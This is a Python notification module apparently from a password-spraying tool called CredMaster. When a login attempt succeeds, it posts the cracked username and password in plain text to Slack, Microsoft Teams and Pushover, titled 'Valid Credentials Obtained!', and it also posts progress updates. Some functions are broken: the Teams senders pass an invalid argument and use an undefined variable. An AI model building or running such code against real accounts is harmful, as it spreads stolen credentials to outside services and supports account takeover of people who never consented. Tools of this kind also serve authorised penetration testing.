import requests, json
from datetime import datetime


def notify_success(username, password, notify_obj):

    slack_webhook = notify_obj['slack_webhook']
    # discord_webhook = notify_obj['discord_webhook']
    teams_webhook = notify_obj['teams_webhook']
    pushover_token = notify_obj['pushover_token']
    pushover_user = notify_obj['pushover_user']

    if slack_webhook is not None:
        slack_notify(username, password, slack_webhook)

    if pushover_token is not None and pushover_user is not None:
        pushover_notify(username, password, pushover_token, pushover_user)

    # if discord_webhook is not None:
    #     discord_notify(username, password, discord_webhook)

    if teams_webhook is not None:
        teams_notify(username, password, teams_webhook)


def notify_update(message, notify_obj):

    slack_webhook = notify_obj['slack_webhook']
    discord_webhook = notify_obj['discord_webhook']
    teams_webhook = notify_obj['teams_webhook']
    pushover_token = notify_obj['pushover_token']
    pushover_user = notify_obj['pushover_user']

    if slack_webhook is not None:
        slack_update(message, slack_webhook)

    if pushover_token is not None and pushover_user is not None:
        pushover_update(message, pushover_token, pushover_user)

    if discord_webhook is not None:
        discord_update(message, discord_webhook)

    if teams_webhook is not None:
        teams_update(message, teams_webhook)


# Function for posting username/password to slack channel
def slack_notify(username, password, webhook):

    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    text = ("```[Valid Credentials Obtained!]\n"
            f"User: {username}\n"
            f"Pass: {password}\n"
            f"Date: {date}\n"
            f"Time: {time}```")

    message = {
        "text" : text
    }

    response = requests.post(
        webhook, data=json.dumps(message),
        headers={'Content-Type': 'application/json'}
    )


# Function for debug messages
def slack_update(message, webhook):

    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    text = ("```[Log Entry]\n"
            f"{message}\n"
            f"Date: {date}\n"
            f"Time: {time}```")

    message = {
        "text" : text
    }
    response = requests.post(
        webhook, data=json.dumps(message),
        headers={'Content-Type': 'application/json'}
    )


# Discord notify message
def discord_update(message, webhook):
    url = webhook
    data = {
    "content" : f"{message}",
    "username" : "CredMaster-Bot"
    }
    response = requests.post(url, json = data)


# Function for posting username/password to Discord
# def discord_notify(username, password, webhook):
#     url = webhook
#     data = {
#     "content" : f"{message}",
#     "username" : "CredMaster-Bot"
#     }
#     response = requests.post(url, json = data)


# Teams notify function
def teams_notify(username, password, webhook):

    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    response = requests.post(
        url=webhook,
        content = ("[Valid Credentials Obtained!]\n"
        f"User: {username}\n"
        f"Pass: {password}\n"
        f"Date: {date}\n"
        f"Time: {time}"),
        headers={"Content-Type": "application/json"},
        json={
            "summary": "[Valid Credentials Obtained!]",
            "sections": [{
                "activityTitle": "CredMaster Bot",
                "activitySubtitle": f"{content}"
            }],
        },
    )

# Teams message notify function
def teams_update(message, webhook):

    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    response = requests.post(
        url=webhook,
        content = ("[Log Entry]\n"
        f"Message: {message}\n"
        f"Date: {date}\n"
        f"Time: {time}"),
        headers={"Content-Type": "application/json"},
        json={
            "summary": "[Log Entry!]",
            "sections": [{
                "activityTitle": "CredMaster Bot",
                "activitySubtitle": f"{content}"
            }],
        },
    )


# Pushover notify of valid creds
def pushover_notify(username, password, token, user):

    headers = {'Content-Type' : 'application/x-www-form-urlencoded'}

    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    text = (f"User: {username}\n"
            f"Pass: {password}\n"
            f"Date: {date}\n"
            f"Time: {time}")

    data = {
        'token' : token,
        'user' : user,
        'title' : '[PassSpray: Valid Credentials Obtained!]',
        'priority' : '1',
        'message' : text
    }

    r = requests.post('https://api.pushover.net/1/messages', headers=headers, data=data)


# Pushover generic update messages
def pushover_update(message, token, user):

    headers = {'Content-Type' : 'application/x-www-form-urlencoded'}

    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    text = (f"{message}\n"
            f"Date: {date}\n"
            f"Time: {time}")

    data = {
        'token' : token,
        'user' : user,
        'title' : '[PassSpray: Log]',
        'priority' : '1',
        'message' : text
    }

    r = requests.post('https://api.pushover.net/1/messages', headers=headers, data=data)
